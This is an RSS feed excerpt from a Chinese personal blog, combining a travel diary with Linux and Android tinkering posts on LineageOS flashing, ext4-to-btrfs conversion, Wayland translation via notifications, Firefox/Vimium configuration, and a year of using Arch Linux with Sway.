&lt;p&gt;阳光正好, 晒在身上暖洋洋的. 我们在下公交之后, 慢慢悠悠前往颐和园的入口, 路上落叶飞舞, 却无半点萧条, 行人来来往往, 一个婴儿车里的小孩指着另一个在妈妈自行车车筐里的小孩羡慕地哇哇直叫, 惹得两边的家长忍俊不禁. 走走停停之间, 我们时而在路边的亭子里歇脚, 时而在红砖绿瓦的不知名府门前驻足拍照, 心下一片闲适.&lt;/p&gt;
&lt;p&gt;进入颐和园后才发现这里出乎意料的大, 但想想这毕竟是皇帝的游玩之地, 倒也算合理. 我们绕过威武的麒麟像, 路过皇帝慈禧临时听政的仁寿宫和一棵棵百年龙柏, 穿过城关, 来到谐趣园. 因为是秋天的缘故, 尽管气温并不让人觉得有秋意, 但是池中的荷花已经尽数枯萎, 风光不再, 宛如那个死去多时的王朝. 沿着回廊行走, 我恼于这行走的空间竟然如此狭窄, 古代的皇帝不与人并肩行走, 其他的人只能尾随, 因此凡是走廊一类的地方都可以设计地窄小一些, 只是我不禁开始无端思考, 长期地处于这样的空间里, 人的心胸眼界是否也会变得狭小呢?&lt;/p&gt;
&lt;p&gt;一路上看到了许多格格打扮的女生在凹造型拍照, 纸扇轻摇, 回眸一笑, 气质优雅, 恬静端庄, 只是都没有我的身边人这般可爱.&lt;/p&gt;
&lt;p&gt;来到苏州街, 我和yq沿河而行, 小心路过一间间无人的商铺. 昔日皇帝为在此重现江南风情, 仿照水镇在此地建造了买卖街, 专供宫中人游览, 即所谓&amp;quot;宫市&amp;quot;. 这个地方1860被列强烧毁, 一百多年后才由共和国重建, 然而我对此类皇室娱乐并不感冒, 只是紧张地一遍遍提醒不停拍照的yq小心别把手机丢进河里.&lt;/p&gt;</description>
    </item>
    <item>
      <title>lineageos使用体验</title>
      <link>https://dragonbox.top/posts/tech-lineageos-md/</link>
      <pubDate>Sun, 13 Aug 2023 21:34:53 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-lineageos-md/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;2024年7月更新: 经过了半年的时候, 遇到的问题包括但不限于 1) 微信卡顿 2) 银行类app无法使用 3) system UI经常崩溃 4) 快充消失. 出于可用性考虑, 已经转回coloros&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;2024年2月更新: Lsposed连同一系列root隐藏模块已经归档无法使用, 为了方便日常使用, 建议卸载magisk, 刷机的时代已经过去了.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;不知道从什么时候开始, 往日被冠以高可玩性高自由度的安卓系统逐渐变得封闭, 一步步沦为资本市场的玩物和工具. MIUI也好, ColorOS也罢, 用户总能在使用系统的过程中发现一些去也去不掉的应用和小程序, 看到一些不想看也得看的广告, 而起初, 有些人尽管对此有所不满, 但基本都选择容忍的态度, 但这几年国内的趋势越来越不对劲: 先是某APP在全社会的宣传下或软性或硬性地被安装在了相当大一部分人的手机中监控个人信息(当然, 我理解打击诈骗行为, 保护平民百姓的钱包远比软件自由重要得多), 又是拼多多被爆出利用安卓手机的0day漏洞在所有用户的手机上进行多种恶意行为, 一直到最近, 一则某信部的发文通知将这种 &lt;code&gt;我的手机不归我管&lt;/code&gt; 的焦虑感推向了新的高潮.&lt;/p&gt;
&lt;p&gt;就目前来看, 这则通知的社会反响并不强烈, 不出意外应该可以顺利推行. 之后最直观的效果就是&lt;strong&gt;所有使用国内安卓系统的用户都只能安装指定的app, 不再具备安装推特等软件的能力&lt;/strong&gt;, 这无异于干掉了安卓最大的特点, 使其沦落为全方位落后于苹果的手机系统. 作为一个经历过安卓app爆发式增长年代的玩家, 我很好奇现在新接触到手机的用户对自己掌中的设备是一个什么样的印象, 是一个拥有无限可能的工具? 还是一个用低质量内容, 广告和充满限制的操作系统来无限吸收注意力, 获取个人隐私并变相管理个人精神世界的资本和政府工具?&lt;/p&gt;
&lt;p&gt;万幸的是, 安卓的开源属性为它保留下了一些自由的火种, 那边是第三方rom. 本文主要记录自己安装 lineageos, magisk, Lsposed 以及一些有用软件的过程.&lt;/p&gt;
&lt;h2 id=&#34;购买机器&#34;&gt;购买机器&lt;/h2&gt;
&lt;p&gt;查看&lt;a href=&#34;https://wiki.lineageos.org/devices/&#34;&gt;lineageos支持的设备列表&lt;/a&gt;, 出于对一加的偏好和对骁龙888发热的不放心, 我选择以一加8pro作为自己的新设备. 在咸鱼上逛了很久, 筛掉一大批机器贩子和低质量卖家后, 我看中了一位宝妈的二手机并下单. 机器到手后我非常满意, 因为成色实在是很好, 连维修店里给我手机换电池的工程师也赞叹保养得不错, 这1700虽然有点贵, 但还是值得的.&lt;/p&gt;</description>
    </item>
    <item>
      <title>动荡时代</title>
      <link>https://dragonbox.top/posts/gossip-unstable-software/</link>
      <pubDate>Wed, 02 Aug 2023 22:42:20 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-unstable-software/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;乱世之中, 唯有自我与我所爱值得珍惜&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>我的neovim</title>
      <link>https://dragonbox.top/posts/tech-neovim2023/</link>
      <pubDate>Wed, 07 Jun 2023 09:32:57 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-neovim2023/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;现在回头看几年前自己写的插件配置文章, 看着那些曾经用过但后来都纷纷被替代的插件, 我会莫名怀念那段因计算机和终端而兴奋不已的自己.&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>2023 小游京城</title>
      <link>https://dragonbox.top/posts/gossip-beijing-travel-2023/</link>
      <pubDate>Wed, 26 Apr 2023 22:54:10 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-beijing-travel-2023/</guid>
      <description>&lt;p&gt;难得黄小姐来一次北京, 作为肥宅的自己紧急规划了一下游玩路线, 发现北京可玩的地方相当的多, 这里仅仅记录这次游玩所经过的三个景区.&lt;/p&gt;</description>
    </item>
    <item>
      <title>优化neovim markdown中的treesitter高亮</title>
      <link>https://dragonbox.top/posts/tech-neovim-treesitter-markdown/</link>
      <pubDate>Tue, 25 Apr 2023 21:33:47 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-neovim-treesitter-markdown/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;eye candy也是一种生产力!&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>树莓派搭载clash作为旁路由</title>
      <link>https://dragonbox.top/posts/tech-openwrt-rasp/</link>
      <pubDate>Thu, 06 Apr 2023 21:29:58 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-openwrt-rasp/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;“一个黑暗的形体，像一个匍匐的人一般大小，但是长着长长的蜘蛛一样的肢体……黑暗中的形体以惊人的速度向他奔来。当它靠近时，他看到那蹲坐着的乌黑身体上有一张脸，在身体底部那些多节的腿之间。那张面孔用一种怀疑和质问的可憎表情凝视着他；而当这个大胆的猎人与那小而狡诈的，四周全是毛发的眼睛对视时，恐惧流遍了他的每一根血管。”&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>ext4到btrfs转换记录</title>
      <link>https://dragonbox.top/posts/tech-ext4-to-btrfs/</link>
      <pubDate>Mon, 16 Jan 2023 05:28:51 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-ext4-to-btrfs/</guid>
      <description>&lt;p&gt;这篇文章是对我从ext4文件系统转换到btrfs过程中的一些操作记录, 便于日后参考.&lt;/p&gt;
&lt;h2 id=&#34;前置准备&#34;&gt;前置准备&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;制作arch linux 启动盘, 版本越新越好.&lt;/li&gt;
&lt;li&gt;备份重要文件&lt;/li&gt;
&lt;li&gt;我个人在转换前会把大文件(例如虚拟机文件)转移到移动硬盘里, 让转换过程更快一些&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;转换&#34;&gt;转换&lt;/h2&gt;
&lt;p&gt;进入LiveCD 系统, 对主分区进行转换&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;btrfs-convert /dev/nvme0n1p2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等待一段时间之后, 显示&lt;code&gt;conversion complete&lt;/code&gt;就表示没有问题, 接下来还需要做三件事情才可以进入系统&lt;/p&gt;
&lt;h3 id=&#34;修改fstab&#34;&gt;修改fstab&lt;/h3&gt;
&lt;p&gt;首先将转换成功后的分区挂载到&lt;code&gt;/mnt&lt;/code&gt;下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount /dev/nvme0n1p2 /mnt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;lsblk -f&lt;/code&gt;命令查看分区的UUID号, 拍个照片记一下&lt;/p&gt;
&lt;p&gt;编辑&lt;code&gt;/mnt/etc/fstab&lt;/code&gt;, 修改这个分区类型为btrfs, 将最后的两列数字都改成0, 保存退出&lt;/p&gt;
&lt;h3 id=&#34;重建内存盘&#34;&gt;重建内存盘&lt;/h3&gt;
&lt;p&gt;先挂载, 然后进入chroot环境&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount -t proc none /mnt/proc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount -t sysfs none /mnt/sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount -o bind /dev /mnt/dev
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chroot /mnt bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后执行下列命令来为所有内核重建内存盘&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkinitcpio -P
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后重建grub引导, 按照道理应该要把引导分区&lt;code&gt;/dev/nvme0n1p1&lt;/code&gt;挂载到&lt;code&gt;/mnt/boot&lt;/code&gt;之后才可以, 但是我记得自己执行的时候没有挂载?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;grub-mkconfig -o /boot/grub/grub.cfg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;重建grub引导&#34;&gt;重建grub引导&lt;/h3&gt;
&lt;p&gt;在上一步的chroot环境中, 执行下列命令, 记得把引导分区挂载到&lt;code&gt;/mnt/boot&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;grub-mkconfig -o /boot/grub/grub.cfg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;大功告成, 退出chroot, 重启电脑就可以进入你的系统了, 唯一的不同是它已经是btrfs了.&lt;/p&gt;</description>
    </item>
    <item>
      <title>wayland下的划词翻译解决方案</title>
      <link>https://dragonbox.top/posts/tech-translation-under-wayland/</link>
      <pubDate>Wed, 11 Jan 2023 04:36:45 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-translation-under-wayland/</guid>
      <description>&lt;p&gt;对于我这种英语不好的人来说, 翻译是离不开的工具, 但是众所周知, Linux的日用软件生态相比较windows和macos来说相差甚远, 别说目前正处于发展阶段的wayland, 就连成熟透了的x11下也没有拿得出手的翻译软件. 作为一个英语不好的Linux爱好者, 缺少翻译软件必定会对日常的使用造成一定的影响, 于是开始思考怎么样解决这个问题.&lt;/p&gt;
&lt;p&gt;我的第一个思路, 也就是见到最多的划词翻译软件的样子, 选中文本之后, 在被选中的文本周围的某块区域中绘制一个窗口, 在其中展示翻译结果. 但是问题来了, 要如何绘制这样的窗口呢? 在wayland中, 窗口的位置交给了compositor进行管理, 这种能够自己决定显示位置的能力, 据我所知, 在wayland下仅有fcitx5做到了, 于是我翻阅了一下它的源代码, 并没有看懂, 但是应该没有借助于Qt和GTK来绘制, 而是使用wayland-client. 对我这样一个连Qt GTK开发经历都没有的人来说, 理解wayland编程开发中的那些概念实在有些困难. 于是紧接着又有一个问题出现了:&lt;/p&gt;
&lt;p&gt;能否绕开wayland?&lt;/p&gt;
&lt;p&gt;就我思考这个问题的时候, linux QQ给我发了一个系统通知, 我的电脑上的系统通知服务原先只是为了让linux qq不崩溃才安装的, 然而这个时候, 它给了我一个新的解决方案: 使用系统通知来呈现翻译结果. 于是搜了一下如何发送系统通知, 发现竟然意外的简单.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;notify-send &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么接下来的问题: 如何获取选中文本的内容? 这个问题, 我原本计划通过阅读&lt;code&gt;wl-clipboard&lt;/code&gt;来学习的, 但是我想先尽快用上翻译, 把优化放到以后再说, 于是决定直接使用&lt;code&gt;wl-clipboard&lt;/code&gt;来获取选中文本内容, 那么至此思路理清, 大致如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用剪切板获取到选中文本的内容, 可以使用&lt;code&gt;wl-paste -p&lt;/code&gt;来获取&lt;/li&gt;
&lt;li&gt;获取文本之后, 将换行符替换成空格 (这块可以有更好的处理方法, 简单起见就全换掉了), 使用&lt;code&gt;sed&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;文本处理完毕后, 将文本输入进&lt;code&gt;translate.js&lt;/code&gt;中进行翻译, (这块可以使用别的现成工具)&lt;/li&gt;
&lt;li&gt;翻译结果出来之后, 将结果以系统通知的形式呈现出来, 当然, 系统通知必须要有, 可以是&lt;code&gt;dunst&lt;/code&gt;, &lt;code&gt;mako&lt;/code&gt;, &lt;code&gt;swaync&lt;/code&gt;, 以及kde或者gnome的桌面消息通知都可以. 发送翻译结果使用命令&lt;code&gt;notify-send &amp;quot;标题&amp;quot; &amp;quot;翻译内容&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以我的划词翻译为案例,  我在&lt;code&gt;~/.config/sway/config&lt;/code&gt;中加入了这么一行作为划词翻译触发按键&lt;/p&gt;</description>
    </item>
    <item>
      <title>武装火狐</title>
      <link>https://dragonbox.top/posts/tech-arm-firefox/</link>
      <pubDate>Mon, 09 Jan 2023 23:04:29 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-arm-firefox/</guid>
      <description>&lt;p&gt;不管火狐的市场份额多么拉胯, 对于Linux wayland用户来说, 目前体验最好的浏览器依旧是Firefox. 本篇记录我的FIrefox配置, 包括浏览器设置和插件设置.&lt;/p&gt;
&lt;h2 id=&#34;外观&#34;&gt;外观&lt;/h2&gt;
&lt;h3 id=&#34;titlebar&#34;&gt;titlebar&lt;/h3&gt;
&lt;p&gt;为了让标题栏中的内容可以更加紧凑, 一个好办法是进入&lt;code&gt;about:config&lt;/code&gt;, 设置&lt;code&gt;browser.compactmode.show&lt;/code&gt;为true, 然后进入custom toolbar, 设置&lt;code&gt;Density&lt;/code&gt;为&lt;code&gt;Compact&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20230109231814714.png&#34; alt=&#34;image-20230109231814714&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;对于wm用户, 一个推荐的设置是勾选上上图中的&lt;code&gt;Title Bar&lt;/code&gt;选项, 为什么要这么设置呢, 因为这样子做, 那些按钮(最大最小化, 关闭窗口)就会出现到title bar中, 然后title bar会被wm吃掉, 这样就可以给火狐的标题栏留出更多的空间&lt;/p&gt;
&lt;p&gt;ps: 我用的主题名字叫做tokyonight&lt;/p&gt;
&lt;h3 id=&#34;firefox-ui-fix&#34;&gt;Firefox-UI-Fix&lt;/h3&gt;
&lt;p&gt;使用&lt;a href=&#34;https://github.com/black7375/Firefox-UI-Fix&#34;&gt;Firefox-UI-Fix&lt;/a&gt;来个性化Firefox的界面&lt;/p&gt;
&lt;h2 id=&#34;addon&#34;&gt;Addon&lt;/h2&gt;
&lt;h3 id=&#34;vimium&#34;&gt;Vimium&lt;/h3&gt;
&lt;p&gt;该插件将vim的操作方式带入到浏览器中, 能够让用户更少依赖鼠标.&lt;/p&gt;
&lt;p&gt;默认情况下, firefox出于安全考虑会在一些页面中禁用Addon, 为了让该插件能够在更多的页面上使用, 需要在&lt;code&gt;about:config&lt;/code&gt;中进行以下设置&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;extensions.webextensions.restrictedDomains&lt;/code&gt;清空掉&lt;/li&gt;
&lt;li&gt;&lt;code&gt;privacy.resistFingerprinting.block_mozAddonManager&lt;/code&gt;设置为true,来让插件在所有页面上都可以使用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以下是我的Vimium键位设置.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Insert your preferred key mappings here.
unmapAll
map H previousTab
map J previousTab
map L nextTab
map K nextTab
map &amp;lt;c-j&amp;gt; scrollPageDown
map &amp;lt;c-k&amp;gt; scrollPageUp
map &amp;lt;c-o&amp;gt; goBack
map &amp;lt;c-i&amp;gt; goForward
map o Vomnibar.activateInNewTab
map b Vomnibar.activateBookmarksInNewTab
map t Vomnibar.activateTabSelection
map M LinkHints.activateModeToOpenInNewTab
map m LinkHints.activateModeToOpenInNewForegroundTab
map gi focusInput
map gg scrollToTop
map G scrollToBottom
map j scrollDown
map k scrollUp
map h scrollLeft
map l scrollRight
map x removeTab
map X restoreTab
map ? showHelp
map yy copyCurrentUrl
map p openCopiedUrlInNewTab
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tip: 如果在某次更新之后发现插件不可用了, 那么可以考虑临时切换到另一个类似的插件 Vimium C , 把相同的键位复制进去就行啦.&lt;/p&gt;</description>
    </item>
    <item>
      <title>2022年度总结</title>
      <link>https://dragonbox.top/posts/gossip-2022-summary/</link>
      <pubDate>Sat, 31 Dec 2022 22:31:25 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-2022-summary/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;2022年是一个记得被纪念的年份, 不是因为它有多好, 而是因为它有多现实&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>小阳人日记</title>
      <link>https://dragonbox.top/posts/gossip-yang-diary-md/</link>
      <pubDate>Tue, 20 Dec 2022 22:45:44 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-yang-diary-md/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;生命本就如此脆弱&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>使用Arch Linux &#43; Sway一年后</title>
      <link>https://dragonbox.top/posts/tech-arch-sway/</link>
      <pubDate>Sat, 17 Dec 2022 14:24:23 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-arch-sway/</guid>
      <description>&lt;p&gt;不知不觉使用sway已经整整一年了，于是来谈一谈自己这一年的使用感受，顺便回顾了一下过去。&lt;/p&gt;
&lt;h2 id=&#34;起因&#34;&gt;起因&lt;/h2&gt;
&lt;p&gt;2019年，在一次编程作业的时候，同专业的另一个老哥向我展示了vim的代码h补全，我立刻被这种简陋但是扩展性极强的代码编辑器吸引了，于是当时还是个刚转入计算机专业的小白就开始哼哧哼哧地学习vim的配置和插件的安装。当然，这些都发生在我的Kali Linux虚拟机中。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20221217104938577.png&#34; alt=&#34;image-20221217104938577&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那个时候我正接触CTF，很多时候都要开着虚拟机，于是有一天动起了把电脑系统直接装成linux的想法。因为自己的第一台笔记本是暗夜精灵2，游戏本装Linux，第一个要考虑的就是兼容性和稳定性，在权衡各个发行版的优势和流行程度后，我选择了ubuntu18.04。笔记本重装完毕后除了风扇转个不停竟然一切运行正常，这让我实在有些惊喜，而风扇问题是英伟达独显导致的，在ubuntu上，只需要一条&lt;code&gt;sudo ubuntu-drivers autoinstall&lt;/code&gt;就完美解决了。当时的自己很开心，仿佛打开了一道新世界的大门。&lt;/p&gt;
&lt;p&gt;后来，我去吉林参加了第一次线下赛，ubuntu没有掉链子，帮我拿了一个一血，我很满意。直到一次上课，手贱执行了&lt;code&gt;apt upgrade&lt;/code&gt;，升级完电脑竟然无法开机了，一整个无语，而当时临近期末，我已经没有时间再去折腾系统了，于是紧急安装了windows应付期末复习，顺便下单了一台对Linux更加友好的笔记本Thinkpad T480。&lt;/p&gt;
&lt;p&gt;期末考试结束后，我听说了Arch Linux 的大名，但是出于畏难情绪，我选择将ubuntu18.04安装在我的thinkpad t480上，然后去参加xman的夏令营。在夏令营期间，我的电脑在连接wifi一段时间后就再也连接不上了，第一次我选择了重装，但是第二次还是同样的问题，我只好绝望地回到windows10，事后分析的时候，我觉得应该是驱动的问题，thinkpad t480是2018年下半年发布的，ubuntu18.04的驱动可能确实没覆盖到它的网卡。&lt;/p&gt;
&lt;p&gt;之后的好几个月里，我都乖乖用着windows10和WSL2，实习的时候全程在虚拟机里面写代码。等到实习结束、保研也结束的时候，我又开始了新一轮的折腾。&lt;/p&gt;
&lt;p&gt;2020年下半年，我将自己的主力电脑全面迁移到了Manjaro Linux下，那个时候qv2ray还很活跃，我的科学上网也很依赖它，但是有好几次在更新的时候发生了Manjaro特有的问题：软件的版本更新上来了，但是软件的依赖没有更新上来，这种问题也影响了trilium等软件，虽然不能怪manjaro，但是我还是愤而转向了Arch Linux，一直到今天我也还在用。&lt;/p&gt;
&lt;p&gt;转到Arch Linux之后，我基本上不再改变自己的发行版了，只是会在图形界面折腾一些。2020年-2021年上半年我使用的都是KDE，好看是真好看，但是Bug也是真的致命，这其中我亲身经历过的至少三次重复出现在不同电脑（thinkpad T480出现过，thinkbook 14p 出现过）的bug就是盒盖睡眠失败，我不知道是谁引起的，是plasma还是conky还是别的什么组件，我不知道，我在日志里也查不到。别看这个问题好像没什么，但是作为一个笔记本用户，盒盖后放进包里是一个非常自然的行为，回到宿舍没有第一时间拿出电脑而是休息一会也是很正常的行为，但是休息完后发现自己的电脑在包里变成了一个铁板烧就不是一个正常的现象了。嘴硬的人当然会说thinkpad不是有指示灯吗？你看指示灯判断是否睡眠成功不就行了？且不说我后来的电脑thinkbook 14p是没有指示灯的，单就系统质量而言，一个系统每次使用的时候都需要用户小心翼翼盯着指示灯看，是否已经说明了这是一个糟糕的系统了？为什么换成thinkbook？就是因为这个bug把我的thinkpad的主板烧坏了！我曾以为这是thinkpad独有的问题，可是当thinkbook也发生同样问题的时候我对KDE彻底失望了，是的，这是一个很漂亮的桌面环境，定制性强又有很多特效，可是这一切都建立在一些不稳定的bug上的时候，这些特效会更多扮演起bug的导火索角色。&lt;/p&gt;
&lt;p&gt;经历过KDE的bug后，我对复杂的桌面环境产生了恐惧，他们就像是一枚不定时炸弹。在这个前提背景下，我接触并开始使用SwayWM，一直到今天，我也还在使用，而那个致命Bug，已经离我远去。&lt;/p&gt;
&lt;h2 id=&#34;体验&#34;&gt;体验&lt;/h2&gt;
&lt;p&gt;得益于Arch Linux庞大的用户群，Arch 的软件包生态在一众发行版中可以说是称王称霸了，我举一个例子，你能想象在Linux的软件仓库中会出现deepin-wine魔改后的腾讯系软件吗？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20221217115944914.png&#34; alt=&#34;image-20221217115944914&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;每次看到其他发行版用户手动下载deb然后安装的时候，我都会产生一种他们是不是在用windows的错觉，并不是看不起别的发行版，只是各有分工和侧重点，比如Arch的定位是桌面端用户，而很多别的发行版的定位是服务器，我不会用别的发行版当作我的桌面系统，就像我不会把Arch装在服务器上一样。用统一的包管理器管理软件包肯定是有好处的，能够大大减轻用户的心智负担。&lt;/p&gt;
&lt;p&gt;至于网络上提到的Arch Linux不稳定、容易滚挂的问题，不好意思，我用了两年Arch了，每天都执行&lt;code&gt;yay -Syyu&lt;/code&gt;，从来没有出现滚挂的问题，相反，我目前所遇到的半数Linux相关问题，都是因为系统软件或者依赖库过于老旧而导致的，更新后就可以解决。Linux不是Windows，如果你不想要更新，那么有两种选择，第一种，锁定自己的软件版本，然后在每次安装新软件的时候单独解决依赖问题；第二种，回去用windows。&lt;/p&gt;
&lt;p&gt;说完了Arch Linux，再来说说Sway，这是一个简单的wayland窗口管理器，为什么用wayland，因为我不希望自己的图形界面建立在一个老旧而难以维护的基础设施之上，那给我的感觉就好像我在使用另一个plasma。诚然，wayland还有很长的一段路要走，很多桌面软件都不得不借助xwayland才能在其上运行，经过实际使用，除了在4k屏幕上xwayland有问题之外，其他情况下还是可以完美工作的。当然，部分软件是有问题的，比如腾讯会议的桌面共享功能，但是也已经有了曲线救国的办法，所以现在wayland的生态已经比之前要好一些了，当我看到linux qq内测群里有人提出wayland下的问题以及要求兼容wayland的时候，我就相信未来还会更好。&lt;/p&gt;
&lt;p&gt;Sway是一个窗口管理器，开发者做的事情是在wayland下复刻一个i3wm出来。窗口管理器的好处是我现在更多依赖键盘而不是鼠标了，可以减少对视觉聚焦于鼠标这种行为的依赖，转而更多依赖自己的触觉，另外，更少的特效和更简洁的设计不仅让我的系统大大增强了稳定性（据一位用KDE的同学说，直到今天，用KDE只要一周不关机就必定会崩溃），还让我自己更加专注于手头的工作（平铺式窗口管理器的统一好处）。不好的地方当然也有不少，比如初次接触的时候要花很多时间去配置和适应，比如每次修改操作键位的时候都需要一定时间去重新适应，比如fcitx5在某些软件下面无法工作或者是有缺陷（这不是fcitx5的锅），比如它让我认识到自己是一个很笨蛋的人，使用了一年了，让我时不时就发现自己的操作习惯可以有优化空间，比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在按win+数字键的时候，用大拇指去按是很扭曲的姿势，**一个更加自然的姿势是用左手的掌心左下（手背视角）的部分去压win键，然后用手指去按数字键。**如果要按ctrl+win，就用同样的部位压住两个键，这个难度会大一些，大概确实还可以优化的。&lt;/li&gt;
&lt;li&gt;调整窗口大小的时候，进入resize模式然后用键盘去按是很低效的行为，相反，这种时候依赖鼠标不是什么坏事，通过把鼠标悬停在窗口上然后按住右键进行拖拽就可以实现快速的窗口大小调整。&lt;/li&gt;
&lt;li&gt;scratchpad中更适合使用tab模式。&lt;/li&gt;
&lt;li&gt;有的时候在两个workspace之间切换会很频繁，这个时候更适合用&lt;code&gt;workspace back_and_forth&lt;/code&gt;而不是一直执着于用数字键去切换，或者使用鼠标的滚轮来切换，这也是一个不错的主意。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除此之外还有一个小的优点，在sway下可以给不同键盘换上不同的布局，这点对我而言是刚需，但是在xorg下面，这种操作往往只能将同一个布局应用于所有的键盘，一旦布局出现了问题导致键盘不可用，那么所有的键盘都会变得不可用。&lt;/p&gt;
